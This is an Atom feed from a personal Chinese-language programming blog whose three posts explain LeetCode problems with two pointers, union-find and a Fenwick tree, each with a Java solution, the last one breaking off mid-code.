<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Elijah Zheng&#39;s Blog</title>
  
  
  <link href="https://blog.zhengxiangling.com/atom.xml" rel="self"/>
  
  <link href="https://blog.zhengxiangling.com/"/>
  <updated>2023-11-19T06:38:37.112Z</updated>
  <id>https://blog.zhengxiangling.com/</id>
  
  <author>
    <name>Elijah Zheng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>左右指针，解接雨水等问题</title>
    <link href="https://blog.zhengxiangling.com/2023/11/19/%E5%B7%A6%E5%8F%B3%E6%8C%87%E9%92%88%EF%BC%8C%E8%A7%A3%E6%8E%A5%E9%9B%A8%E6%B0%B4%E7%AD%89%E9%97%AE%E9%A2%98/"/>
    <id>https://blog.zhengxiangling.com/2023/11/19/%E5%B7%A6%E5%8F%B3%E6%8C%87%E9%92%88%EF%BC%8C%E8%A7%A3%E6%8E%A5%E9%9B%A8%E6%B0%B4%E7%AD%89%E9%97%AE%E9%A2%98/</id>
    <published>2023-11-19T06:34:00.000Z</published>
    <updated>2023-11-19T06:38:37.112Z</updated>
    
    <content type="html"><![CDATA[<p>求解区间时，受左右两端的值影响，并向中间区域靠拢求值时可用。</p><h5 id="11-盛最多水的容器"><a href="#11-盛最多水的容器" class="headerlink" title="11.盛最多水的容器"></a>11.盛最多水的容器</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/container-with-most-water/description/">11. 盛最多水的容器</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>给定一个长度为 <code>n</code> 的整数数组&nbsp;<code>height</code>&nbsp;。有&nbsp;<code>n</code>&nbsp;条垂线，第 <code>i</code> 条线的两个端点是&nbsp;<code>(i, 0)</code>&nbsp;和&nbsp;<code>(i, height[i])</code>&nbsp;。</p><p>找出其中的两条线，使得它们与&nbsp;<code>x</code>&nbsp;轴共同构成的容器可以容纳最多的水。</p><p>返回容器可以储存的最大水量。</p><p><strong>说明：</strong>你不能倾斜容器。</p><p><strong>示例 1：</strong></p><p><img alt="" src="https://aliyun-lc-upload.oss-cn-hangzhou.aliyuncs.com/aliyun-lc-upload/uploads/2018/07/25/question_11.jpg" class="lazyload" data-srcset="https://aliyun-lc-upload.oss-cn-hangzhou.aliyuncs.com/aliyun-lc-upload/uploads/2018/07/25/question_11.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><pre><strong>输入：</strong>[1,8,6,2,5,4,8,3,7]<strong>输出：</strong>49 <strong>解释：</strong>图中垂直线代表输入数组 [1,8,6,2,5,4,8,3,7]。在此情况下，容器能够容纳水（表示为蓝色部分）的最大值为&nbsp;49。</pre><p><strong>示例 2：</strong></p><pre><strong>输入：</strong>height = [1,1]<strong>输出：</strong>1</pre><p><strong>提示：</strong></p><ul>    <li><code>n == height.length</code></li>    <li><code>2 &lt;= n &lt;= 10<sup>5</sup></code></li>    <li><code>0 &lt;= height[i] &lt;= 10<sup>4</sup></code></li></ul></div><ol><li><p>思路</p><blockquote><p>接雨水plus，面积由左右两条线和j - i 围成的面积决定，而改变左右两条线怎么改变需要一些思考归纳。</p></blockquote></li><li><p>解题方法</p><blockquote><p>左右两条线怎么决定移动哪一条，可以解释为：移动最大的线，可能导致找不到最多水的容器，如果移动最小的线，可能会找到更大的容器，所以双指针每次移动的都是最小的那条线。</p></blockquote></li><li><p>复杂度</p><ul><li><p>时间复杂度:</p><blockquote><p>$O(n)$</p></blockquote></li><li><p>空间复杂度:</p><blockquote><p>$O(1)$</p></blockquote></li></ul></li><li><p>Code</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxArea</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        <span class="comment">// 状态由左右两条线 和 宽度(j - i) 决定</span></span><br><span class="line">        <span class="comment">// 左右两条线，能盛水的大小由短边决定</span></span><br><span class="line">        <span class="comment">// 那么左右两条线怎么决定移动哪一条，可以解释为：移动最大的线，可能导致找不到最多水的容器，如果移动最小的线，可能会找到更大的容器</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> height.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(l &lt; r) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">area</span> <span class="operator">=</span> Math.min(height[l], height[r]) * (r - l);</span><br><span class="line">            ans = Math.max(ans, area);</span><br><span class="line">            <span class="keyword">if</span> (height[l] &lt; height[r]) &#123;</span><br><span class="line">                l ++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                r --;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;求解区间时，受左右两端的值影响，并向中间区域靠拢求值时可用。&lt;/p&gt;
&lt;h5 id=&quot;11-盛最多水的容器&quot;&gt;&lt;a href=&quot;#11-盛最多水的容器&quot; class=&quot;headerlink&quot; title=&quot;11.盛最多水的容器&quot;&gt;&lt;/a&gt;11.盛最多水的容器&lt;/h5&gt;&lt;bl</summary>
      
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="双指针" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E5%8F%8C%E6%8C%87%E9%92%88/"/>
    
    
  </entry>
  
  <entry>
    <title>并查集，求连通分量和拓扑排序等问题</title>
    <link href="https://blog.zhengxiangling.com/2023/11/19/%E5%B9%B6%E6%9F%A5%E9%9B%86%EF%BC%8C%E6%B1%82%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F%E5%92%8C%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F%E7%AD%89%E9%97%AE%E9%A2%98/"/>
    <id>https://blog.zhengxiangling.com/2023/11/19/%E5%B9%B6%E6%9F%A5%E9%9B%86%EF%BC%8C%E6%B1%82%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F%E5%92%8C%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F%E7%AD%89%E9%97%AE%E9%A2%98/</id>
    <published>2023-11-19T06:25:00.000Z</published>
    <updated>2023-11-19T06:30:30.684Z</updated>
    
    <content type="html"><![CDATA[<p>图，求连通分量，判断点与点是否连通，求拓扑排序等问题，可以使用并查集去解决问题。</p><span id="more"></span><h5 id="并查集模板"><a href="#并查集模板" class="headerlink" title="并查集模板"></a>并查集模板</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UF</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] parent;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UF</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        count = n;</span><br><span class="line">        parent = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            parent[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (parent[x] != x) &#123;</span><br><span class="line">            parent[x] = find(parent[x]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> parent[x];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">union</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rootP</span> <span class="operator">=</span> find(p);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rootQ</span> <span class="operator">=</span> find(q);</span><br><span class="line">        <span class="keyword">if</span> (rootP == rootQ) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        parent[rootQ] = rootP;</span><br><span class="line">        count --;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> find(p) == find(q);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="684-冗余连接"><a href="#684-冗余连接" class="headerlink" title="684.冗余连接"></a>684.冗余连接</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/redundant-connection/description/">684. 冗余连接</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>树可以看成是一个连通且 <strong>无环&nbsp;</strong>的&nbsp;<strong>无向&nbsp;</strong>图。</p><p>给定往一棵&nbsp;<code>n</code> 个节点 (节点值&nbsp;<code>1～n</code>) 的树中添加一条边后的图。添加的边的两个顶点包含在 <code>1</code> 到 <code>n</code>&nbsp;中间，且这条附加的边不属于树中已存在的边。图的信息记录于长度为 <code>n</code> 的二维数组 <code>edges</code>&nbsp;，<code>edges[i] = [a<sub>i</sub>, b<sub>i</sub>]</code>&nbsp;表示图中在 <code>ai</code> 和 <code>bi</code> 之间存在一条边。</p><p>请找出一条可以删去的边，删除后可使得剩余部分是一个有着 <code>n</code> 个节点的树。如果有多个答案，则返回数组&nbsp;<code>edges</code>&nbsp;中最后出现的那个。</p><p><strong>示例 1：</strong></p><p><img alt="" src="https://pic.leetcode-cn.com/1626676174-hOEVUL-image.png" class="lazyload" data-srcset="https://pic.leetcode-cn.com/1626676174-hOEVUL-image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="width: 152px;"></p><pre><strong>输入:</strong> edges = [[1,2], [1,3], [2,3]]<strong>输出:</strong> [2,3]</pre><p><strong>示例 2：</strong></p><p><img alt="" src="https://pic.leetcode-cn.com/1626676179-kGxcmu-image.png" class="lazyload" data-srcset="https://pic.leetcode-cn.com/1626676179-kGxcmu-image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="width: 250px;"></p><pre><strong>输入:</strong> edges = [[1,2], [2,3], [3,4], [1,4], [1,5]]<strong>输出:</strong> [1,4]</pre><p><strong>提示:</strong></p><ul>    <li><code>n == edges.length</code></li>    <li><code>3 &lt;= n &lt;= 1000</code></li>    <li><code>edges[i].length == 2</code></li>    <li><code>1 &lt;= ai&nbsp;&lt; bi&nbsp;&lt;= edges.length</code></li>    <li><code>ai != bi</code></li>    <li><code>edges</code> 中无重复元素</li>    <li>给定的图是连通的&nbsp;</li></ul></div><ol><li><p>思路</p><blockquote><p>题目的题意一开始的图就是一个连通图，那么求可以删除的最后一条边，即所有给出的边连接成一个连通图有哪条边是多余的可以不拿来连接。</p></blockquote></li><li><p>解题方法</p><blockquote><p>把给出的边拿来做并查集构建连通图，如果哪条边是多余的（即connect为true），并且求是最后一个connect 为true，即为答案。</p></blockquote></li><li><p>复杂度</p></li></ol><ul><li><p>时间复杂度:</p><blockquote><p>循环n个点$O(n)$，并查集$O(logn)$，时间复杂度共$O(nlogn)$</p></blockquote></li><li><p>空间复杂度:</p><blockquote><p>$O(n)$</p></blockquote></li></ul><ol start="4"><li>Code</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] findRedundantConnection(<span class="type">int</span>[][] edges) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> edges.length;</span><br><span class="line">        <span class="type">UF</span> <span class="variable">graph</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UF</span>(n);</span><br><span class="line">        <span class="type">int</span>[] ans = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] edge: edges) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> edge[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> edge[<span class="number">1</span>] - <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// System.out.println(graph.connect(a, b));</span></span><br><span class="line">            <span class="keyword">if</span> (graph.connect(a, b)) &#123;</span><br><span class="line">                ans = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;a + <span class="number">1</span>, b + <span class="number">1</span>&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                graph.union(a, b);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UF</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] parent;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UF</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        count = n;</span><br><span class="line">        parent = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            parent[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (parent[x] != x) &#123;</span><br><span class="line">            parent[x] = find(parent[x]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> parent[x];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">union</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rootP</span> <span class="operator">=</span> find(p);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rootQ</span> <span class="operator">=</span> find(q);</span><br><span class="line">        <span class="keyword">if</span> (rootP == rootQ) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        parent[rootQ] = rootP;</span><br><span class="line">        count --;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> find(p) == find(q);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;图，求连通分量，判断点与点是否连通，求拓扑排序等问题，可以使用并查集去解决问题。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="并查集" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E5%B9%B6%E6%9F%A5%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>树状数组，用于快速求解范围区间的和</title>
    <link href="https://blog.zhengxiangling.com/2023/11/19/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%EF%BC%8C%E7%94%A8%E4%BA%8E%E5%BF%AB%E9%80%9F%E6%B1%82%E8%A7%A3%E8%8C%83%E5%9B%B4%E5%8C%BA%E9%97%B4%E5%86%85%E7%9A%84%E5%80%BC/"/>
    <id>https://blog.zhengxiangling.com/2023/11/19/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%EF%BC%8C%E7%94%A8%E4%BA%8E%E5%BF%AB%E9%80%9F%E6%B1%82%E8%A7%A3%E8%8C%83%E5%9B%B4%E5%8C%BA%E9%97%B4%E5%86%85%E7%9A%84%E5%80%BC/</id>
    <published>2023-11-19T05:28:00.000Z</published>
    <updated>2023-11-19T06:22:58.803Z</updated>
    
    <content type="html"><![CDATA[<p>求解数组区间的和，有前缀和、差分数组、树状数组，但各所适用的场景不用。</p><ul><li>前缀和适用于数组的值一开始固定不变的情况；</li><li>差分数组适用于数组的值会改变（增加|删除），但是求解原数据时需要恢复数据；</li><li>树状数组适用数组的值会改变，还可以快速求解一段区间的和，但需要构建数据结构。</li></ul><span id="more"></span><h5 id="树状数组模板"><a href="#树状数组模板" class="headerlink" title="树状数组模板"></a>树状数组模板</h5><p>包括建树、查询区间值等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接上树状数组的结构</span></span><br><span class="line"><span class="type">int</span>[] tree;</span><br><span class="line"><span class="type">int</span>[] num;</span><br><span class="line"><span class="type">int</span> len;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lowbit</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x &amp; (-x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(index &lt; len) &#123;</span><br><span class="line">        tree[index] += val;</span><br><span class="line">        index += lowbit(index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">query</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (index &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sum += tree[index];</span><br><span class="line">        index -= lowbit(index);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">NumArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">   num = nums;</span><br><span class="line">   len = nums.length + <span class="number">1</span>; <span class="comment">// 树状数组下标从1开始</span></span><br><span class="line">   tree = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">       add(i + <span class="number">1</span>, nums[i]);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="307-区域和检索-数组可修改（中等）"><a href="#307-区域和检索-数组可修改（中等）" class="headerlink" title="307.区域和检索 - 数组可修改（中等）"></a>307.区域和检索 - 数组可修改（中等）</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/range-sum-query-mutable/description/">307. 区域和检索 - 数组可修改</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>给你一个数组 <code>nums</code> ，请你完成两类查询。</p><ol>    <li>其中一类查询要求 <strong>更新</strong> 数组&nbsp;<code>nums</code>&nbsp;下标对应的值</li>    <li>另一类查询要求返回数组&nbsp;<code>nums</code>&nbsp;中索引&nbsp;<code>left</code>&nbsp;和索引&nbsp;<code>right</code>&nbsp;之间（&nbsp;<strong>包含&nbsp;</strong>）的nums元素的 <strong>和</strong>&nbsp;，其中&nbsp;<code>left &lt;= right</code></li></ol><p>实现 <code>NumArray</code> 类：</p><ul>    <li><code>NumArray(int[] nums)</code> 用整数数组 <code>nums</code> 初始化对象</li>    <li><code>void update(int index, int val)</code> 将 <code>nums[index]</code> 的值 <strong>更新</strong> 为 <code>val</code></li>    <li><code>int sumRange(int left, int right)</code> 返回数组&nbsp;<code>nums</code>&nbsp;中索引&nbsp;<code>left</code>&nbsp;和索引&nbsp;<code>right</code>&nbsp;之间（&nbsp;<strong>包含&nbsp;</strong>）的nums元素的 <strong>和</strong>&nbsp;（即，<code>nums[left] + nums[left + 1], ..., nums[right]</code>）</li></ul><p><strong>示例 1：</strong></p><pre><strong>输入</strong>：["NumArray", "sumRange", "update", "sumRange"][[[1, 3, 5]], [0, 2], [1, 2], [0, 2]]<strong>输出</strong>：[null, 9, null, 8]<strong>解释</strong>：NumArray numArray = new NumArray([1, 3, 5]);numArray.sumRange(0, 2); // 返回 1 + 3 + 5 = 9numArray.update(1, 2);   // nums = [1,2,5]numArray.sumRange(0, 2); // 返回 1 + 2 + 5 = 8</pre><p>&nbsp;</p><ul>    <li><code>1 &lt;= nums.length &lt;= 3 *&nbsp;10<sup>4</sup></code></li>    <li><code>-100 &lt;= nums[i] &lt;= 100</code></li>    <li><code>0 &lt;= index &lt; nums.length</code></li>    <li><code>-100 &lt;= val &lt;= 100</code></li>    <li><code>0 &lt;= left &lt;= right &lt; nums.length</code></li>    <li>调用 <code>update</code> 和 <code>sumRange</code> 方法次数不大于&nbsp;<code>3 * 10<sup>4</sup></code>&nbsp;</li></ul></div><ol><li><p>思路</p><blockquote><p>本题需要对数组区间求和，并且需要频繁修改数组中的值，排除前缀和，可以使用树状数组和线段树，但是能用树状数组优先使用树状数组，实现起来会更方便。</p></blockquote></li><li><p>解题方法</p><blockquote><p>直接上树状数组结构，然后放入实现类中即可。</p></blockquote></li><li><p>复杂度</p><ul><li><p>时间复杂度:</p><blockquote><p>$O(logn)$</p></blockquote></li><li><p>空间复杂度:</p><blockquote><p>$O(n)$</p></blockquote></li></ul></li><li><p>Code</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NumArray</span> &#123;</span><br><span class="line">    <span class="comment">// 区间求和，如果数组的值不变，可以直接用前缀和，这里需要update数组内的单个值，可以优先考虑用树状数组实现比较简单，但是也可以用线段树</span></span><br><span class="line">    <span class="comment">// 直接上树状数组的结构</span></span><br><span class="line">    <span class="type">int</span>[] tree;</span><br><span class="line">    <span class="type">int</span>[] num;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lowbit</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x &amp; (-x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(index &lt; len) &#123;</span><br><span class="line">            tree[index] += val;</span><br><span class="line">            index += lowbit(index);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">query</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (index &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            sum += tree[index];</span><br><span class="line">            index -= lowbit(index);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NumArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">       num = nums;</span><br><span class="line">       len = nums.length + <span class="number">1</span>; <span class="comment">// 树状数组下标从1开始</span></span><br><span class="line">       tree = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">           add(i + <span class="number">1</span>, nums[i]);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">       <span class="comment">// 计算需要更改的值为 val - num[index]</span></span><br><span class="line">       add(index + <span class="number">1</span>, val - num[index]);</span><br><span class="line">       num[index] = val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumRange</span><span class="params">(<span class="type">int</span> left, 